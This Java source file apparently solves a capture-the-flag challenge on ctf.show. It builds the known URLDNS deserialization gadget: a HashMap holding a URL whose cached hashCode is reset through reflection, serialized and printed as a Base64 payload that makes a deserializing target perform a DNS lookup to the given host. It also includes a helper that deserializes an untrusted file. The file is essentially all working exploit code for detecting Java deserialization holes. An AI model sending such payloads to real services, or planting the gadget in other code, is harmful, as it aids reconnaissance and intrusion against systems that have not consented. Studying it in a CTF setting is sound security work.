package gadget;


import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;

public class URLDNS1 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        HashMap<Object,String> hashmap=new HashMap<Object,String>();
        Base64.Encoder encoder = Base64.getEncoder();
        URL url=new URL("http://d8571d07-9fda-42fc-8f49-ddbbba30a1f9.challenge.ctf.show/");
        hashmap.put(url,"Squirt1e");
        Class clazz=url.getClass();
        Field hashcode=clazz.getDeclaredField("hashCode");
        hashcode.setAccessible(true);
        hashcode.set(url,-1);

//        System.out.println(payload);
        String encode = Base64.getEncoder().encodeToString(serialize(hashmap));
        System.out.println(encode);
//        byte[] decode = Base64.getDecoder().decode(encode);
//        System.out.println(decode);


    }
    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream aos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(aos);
        oos.writeObject(obj);
        oos.flush();
        oos.close();
        return aos.toByteArray();
    }

    public static void unserialize() throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("URLDNS.bin"));
        objectInputStream.readObject();
    }
}
